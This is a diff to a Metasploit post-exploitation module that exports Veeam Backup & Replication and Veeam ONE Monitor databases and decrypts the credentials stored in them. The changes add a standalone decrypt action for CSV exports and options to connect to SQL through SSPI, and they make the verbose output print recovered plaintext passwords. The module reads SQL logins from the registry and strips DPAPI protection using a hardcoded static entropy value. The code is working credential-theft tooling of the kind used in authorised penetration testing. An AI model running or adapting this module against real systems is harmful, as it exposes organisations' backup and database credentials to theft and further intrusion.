@@ -37,13 +37,19 @@ class MetasploitModule < Msf::Post
           [
             'Dump',
             {
-              'Description' => 'Export Veeam Backup & Replication database and perform decryption'
+              'Description' => 'Export Veeam databases and perform decryption'
             }
           ],
           [
             'Export',
             {
-              'Description' => 'Export Veeam Backup & Replication database without decryption'
+              'Description' => 'Export Veeam databases without decryption'
+            }
+          ],
+          [
+            'Decrypt',
+            {
+              'Description' => 'Decrypt Veeam database export CSV files'
             }
           ]
         ],
@@ -57,7 +63,13 @@ class MetasploitModule < Msf::Post
       )
     )
     register_advanced_options([
-      OptBool.new('BATCH_DPAPI', [ true, 'Perform DPAPI PowerShell decryption in a single call', true ])
+      OptBool.new('BATCH_DPAPI', [ true, 'Perform DPAPI PowerShell decryption in a single call', true ]),
+      OptPath.new('VBR_CSV_FILE', [ false, 'Path to VBR database export CSV file if using the decrypt action' ]),
+      OptPath.new('VOM_CSV_FILE', [ false, 'Path to VOM database export CSV file if using the decrypt action' ]),
+      OptString.new('VBR_MSSQL_INSTANCE', [ false, 'The VBR MSSQL instance path' ]),
+      OptString.new('VBR_MSSQL_DB', [ false, 'The VBR MSSQL database name' ]),
+      OptString.new('VOM_MSSQL_INSTANCE', [ false, 'The VOM MSSQL instance path' ]),
+      OptString.new('VOM_MSSQL_DB', [ false, 'The VOM MSSQL database name' ])
     ])
   end
 
@@ -78,8 +90,11 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    init_module
     current_action = action.name.downcase
+    if current_action == 'decrypt' && !datastore['VBR_CSV_FILE'] && !datastore['VOM_CSV_FILE']
+      fail_with(Msf::Exploit::Failure::BadConfig, 'You must set either the VBR_CSV_FILE or VOM_CSV_FILE advanced options')
+    end
+    init_module
     if current_action == 'export' || current_action == 'dump'
       if vbr?
         print_status('Performing export of Veeam Backup & Replication SQL database to CSV file')
@@ -92,20 +107,28 @@ class MetasploitModule < Msf::Post
         print_good("Encrypted Veeam ONE Monitor Database Dump: #{vom_encrypted_csv_file}")
       end
     end
-    if current_action == 'dump'
+    if current_action == 'decrypt' || current_action == 'dump'
+      vbr_encrypted_csv_file ||= datastore['VBR_CSV_FILE']
+      vom_encrypted_csv_file ||= datastore['VOM_CSV_FILE']
       if vbr?
-        fail_with(Msf::Exploit::Failure::BadConfig, 'Invalid VBR CSV input file') unless ::File.file?(vbr_encrypted_csv_file)
+        fail_with(Msf::Exploit::Failure::BadConfig, 'You must set VBR_CSV_FILE advanced option') if vbr_encrypted_csv_file.nil? && vom_encrypted_csv_file.nil?
+        if vbr_encrypted_csv_file
+          fail_with(Msf::Exploit::Failure::BadConfig, 'Invalid VBR CSV input file') unless ::File.file?(vbr_encrypted_csv_file)
 
-        print_status('Performing decryption of Veeam Backup & Replication SQL database')
-        vbr_decrypted_csv_file = decrypt(vbr_encrypted_csv_file, 'vbr')
-        print_good("Decrypted Veeam Backup & Replication Database Dump: #{vbr_decrypted_csv_file}")
+          print_status('Performing decryption of Veeam Backup & Replication SQL database')
+          vbr_decrypted_csv_file = decrypt(vbr_encrypted_csv_file, 'vbr')
+          print_good("Decrypted Veeam Backup & Replication Database Dump: #{vbr_decrypted_csv_file}")
+        end
       end
       if vom?
-        fail_with(Msf::Exploit::Failure::BadConfig, 'Invalid VOM CSV input file') unless ::File.file?(vom_encrypted_csv_file)
+        fail_with(Msf::Exploit::Failure::BadConfig, 'You must set VOM_CSV_FILE advanced option') if vom_encrypted_csv_file.nil? && vbr_encrypted_csv_file.nil?
+        if vom_encrypted_csv_file
+          fail_with(Msf::Exploit::Failure::BadConfig, 'Invalid VOM CSV input file') unless ::File.file?(vom_encrypted_csv_file)
 
-        print_status('Performing decryption of Veeam ONE Monitor SQL database')
-        vom_decrypted_csv_file = decrypt(vom_encrypted_csv_file, 'vom')
-        print_good("Decrypted Veeam ONE Monitor Database Dump: #{vom_decrypted_csv_file}")
+          print_status('Performing decryption of Veeam ONE Monitor SQL database')
+          vom_decrypted_csv_file = decrypt(vom_encrypted_csv_file, 'vom')
+          print_good("Decrypted Veeam ONE Monitor Database Dump: #{vom_decrypted_csv_file}")
+        end
       end
     end
   end
@@ -131,13 +154,12 @@ class MetasploitModule < Msf::Post
   end
 
   def decrypt(csv_file, target)
-    case target.downcase
-    when 'vbr'
-      target_name = 'VBR'
+    target_name = target.upcase
+    case target_name
+    when 'VBR'
       target_vbr = true
       target_vom = false
-    when 'vom'
-      target_name = 'VOM'
+    when 'VOM'
       target_vom = true
       target_vbr = false
     else
@@ -272,7 +294,7 @@ class MetasploitModule < Msf::Post
       result_line = [credential_id.to_s, secret_usn.to_s, secret_username.to_s, secret_plaintext.to_s, secret_description.to_s, secret_visible.to_s]
       result_row = ::CSV.parse_line(CSV.generate_line(result_line).gsub("\r", ''))
       result_csv << result_row
-      vprint_status("ID #{credential_id} username '#{secret_username}' password recovered: #{secret_disposition}")
+      vprint_status("ID #{credential_id} username '#{secret_username}' password recovered: #{secret_plaintext} (#{secret_disposition})")
     end
     {
       processed_rows: current_row,
@@ -329,7 +351,7 @@ class MetasploitModule < Msf::Post
       result_line = [credential_id.to_s, secret_usn.to_s, secret_username.to_s, secret_plaintext.to_s, secret_description.to_s, secret_disposition.to_s, secret_visible.to_s]
       result_row = ::CSV.parse_line(CSV.generate_line(result_line).gsub("\r", ''))
       result_csv << result_row
-      vprint_status("ID #{credential_id} username '#{secret_username}' password recovered: #{secret_disposition}")
+      vprint_status("ID #{credential_id} username '#{secret_username}' password recovered: #{secret_plaintext} (#{secret_disposition})")
     end
     {
       processed_rows: current_row,
@@ -347,7 +369,7 @@ class MetasploitModule < Msf::Post
     require_sql = action.name.downcase == 'export' || action.name.downcase == 'dump'
     get_vbr_version
     get_vom_version
-    fail_with(Msf::Exploit::Failure::NoTarget, 'No Veeam products detected') unless @vbr_build || @vom_build
+    fail_with(Msf::Exploit::Failure::NoTarget, 'No Veeam products detected') unless vbr? || vom?
     if require_sql
       get_sql_client
       fail_with(Msf::Exploit::Failure::BadConfig, 'Unable to identify sqlcmd SQL client on target host') unless @sql_client == 'sqlcmd'
@@ -361,7 +383,15 @@ class MetasploitModule < Msf::Post
     fail_with(Msf::Exploit::Failure::NoTarget, "CSV file #{file_name} not found") unless ::File.file?(file_name)
 
     csv_rows = ::File.binread(file_name)
-    csv = ::CSV.parse(csv_rows.gsub("\r", ''), row_sep: :auto, headers: :first_row, quote_char: "\x00", skip_blanks: true)
+    csv = ::CSV.parse(
+      csv_rows.gsub("\r", ''),
+      row_sep: :auto,
+      headers: :first_row,
+      quote_char: "\x00",
+      skip_blanks: true,
+      header_converters: ->(f) { f.strip },
+      converters: ->(f) { f ? f.strip : nil }
+    )
     fail_with(Msf::Exploit::Failure::NoTarget, "Error importing CSV file #{file_name}") unless csv
 
     @vbr_total_secrets = csv['ID'].uniq.count
@@ -419,8 +449,8 @@ class MetasploitModule < Msf::Post
       return nil
     end
     vbr_path = registry_getvaldata(reg_key, 'CorePath').to_s.gsub(/\\$/, '')
-    unless vbr_path
-      print_error("Could not find CorePath registry entry under #{reg_key}")
+    if vbr_path.empty?
+      print_error("Could not find VBR CorePath registry entry under #{reg_key}")
       return nil
     end
     print_status("Veeam Backup & Replication Install Path: #{vbr_path}")
@@ -434,8 +464,8 @@ class MetasploitModule < Msf::Post
       return nil
     end
     vom_client_path = registry_getvaldata(reg_key, 'MonitorX64ClientDistributivePath').to_s
-    unless vom_client_path
-      print_error("Could not find MonitorX64ClientDistributivePath registry entry under #{reg_key}")
+    if vom_client_path.empty?
+      print_error("Could not find VOM MonitorX64ClientDistributivePath registry entry under #{reg_key}")
       return nil
     end
     vom_path = vom_client_path.split('\ClientPackages\VeeamONE.Monitor.Client.x64.msi').first.to_s.gsub(/\\$/, '')
@@ -465,23 +495,37 @@ class MetasploitModule < Msf::Post
 
   def init_veeam_db
     print_status('Get Veeam SQL Parameters ...')
-    vbr_db_conf = get_vbr_database_config if vbr?
-    vom_db_conf = get_vom_database_config if vom?
-    if vbr? && vbr_db_conf
-      vbr_conf = db_conf_build(vbr_db_conf)
-      @vbr_db_instance_path = vbr_conf['db_instance_path']
-      @vbr_db_name = vbr_conf['db_name']
-      @vbr_db_user = vbr_conf['db_user']
-      @vbr_db_pass = vbr_conf['db_pass']
-      @vbr_db_integrated_auth = vbr_conf['db_integrated_auth']
+    if vbr?
+      if datastore['VBR_MSSQL_INSTANCE'] && datastore['VBR_MSSQL_DB']
+        print_status('VBR_MSSQL_INSTANCE and VBR_MSSQL_DB advanced options set, connect to VBR SQL using SSPI')
+        @vbr_db_instance_path = datastore['VBR_MSSQL_INSTANCE']
+        @vbr_db_name = datastore['VBR_MSSQL_DB']
+        @vbr_db_integrated_auth = true
+      else
+        vbr_db_conf = get_vbr_database_config
+        vbr_conf = db_conf_build(vbr_db_conf)
+        @vbr_db_instance_path = vbr_conf['db_instance_path']
+        @vbr_db_name = vbr_conf['db_name']
+        @vbr_db_user = vbr_conf['db_user']
+        @vbr_db_pass = vbr_conf['db_pass']
+        @vbr_db_integrated_auth = vbr_conf['db_integrated_auth']
+      end
     end
-    if vom? && vom_db_conf
-      vom_conf = db_conf_build(vom_db_conf)
-      @vom_db_instance_path = vom_conf['db_instance_path']
-      @vom_db_name = vom_conf['db_name']
-      @vom_db_user = vom_conf['db_user']
-      @vom_db_pass = vom_conf['db_pass']
-      @vom_db_integrated_auth = vom_conf['db_integrated_auth']
+    if vom?
+      if datastore['VOM_MSSQL_INSTANCE'] && datastore['VOM_MSSQL_DB']
+        print_status('VOM_MSSQL_INSTANCE and VOM_MSSQL_DB advanced options set, connect to VOM SQL using SSPI')
+        @vom_db_instance_path = datastore['VOM_MSSQL_INSTANCE']
+        @vom_db_name = datastore['VOM_MSSQL_DB']
+        @vom_db_integrated_auth = true
+      else
+        vom_db_conf = get_vom_database_config
+        vom_conf = db_conf_build(vom_db_conf)
+        @vom_db_instance_path = vom_conf['db_instance_path']
+        @vom_db_name = vom_conf['db_name']
+        @vom_db_user = vom_conf['db_user']
+        @vom_db_pass = vom_conf['db_pass']
+        @vom_db_integrated_auth = vom_conf['db_integrated_auth']
+      end
     end
   end
 
@@ -544,7 +588,7 @@ class MetasploitModule < Msf::Post
     mssql_host = registry_getvaldata(reg_key, 'SqlServerName').to_s.delete("\000")
     mssql_instance = registry_getvaldata(reg_key, 'SqlInstanceName').to_s.delete("\000")
     mssql_db = registry_getvaldata(reg_key, 'SqlDatabaseName').to_s.delete("\000")
-    fail_with(Msf::Exploit::Failure::NoTarget, "Could not read SQL parameters from #{reg_key}") unless mssql_host && mssql_instance && mssql_db
+    fail_with(Msf::Exploit::Failure::NoTarget, "Could not read SQL parameters from #{reg_key}") if mssql_host.empty? && mssql_instance.empty? && mssql_db.empty?
 
     mssql_login = registry_getvaldata(reg_key, 'SqlLogin').to_s.delete("\000")
     mssql_pass_enc = registry_getvaldata(reg_key, 'SqlSecuredPassword').to_s.delete("\000")
@@ -562,12 +606,13 @@ class MetasploitModule < Msf::Post
       res['USER ID'] = mssql_login
       res['PASSWORD'] = mssql_pass
     end
+
     res
   end
 
   def get_vom_database_config
-    # MachineKey DPAPI with static entropy twist:
-    # Static entropy is Base64 encoded BINARY_BLOB of UTF-16LE text "{F0F8C9DE-AB1E-48b6-8221-665E5B016E70}"
+    # MachineKey DPAPI with static entropy twist
+    # Static entropy is a BINARY_BLOB of UTF-16LE text "{F0F8C9DE-AB1E-48b6-8221-665E5B016E70}"
     # This value is burned into VeeamRegSettings.dll
     reg_key = 'HKLM\\SOFTWARE\\Veeam\\Veeam ONE Monitor\\db_config'
     fail_with(Msf::Exploit::Failure::NoTarget, "Could not read #{reg_key}") unless registry_key_exist?(reg_key)
@@ -601,7 +646,7 @@ class MetasploitModule < Msf::Post
       res['USER ID'] = mssql_user
       res['PASSWORD'] = mssql_pass
     else
-      fail_with(Msf::Exploit::Failure::NoTarget, 'Failed to extract SQL native login credential')
+      fail_with(Msf::Exploit::Failure::NoTarget, 'Failed to extract VOM SQL native login credential')
     end
     res
   end
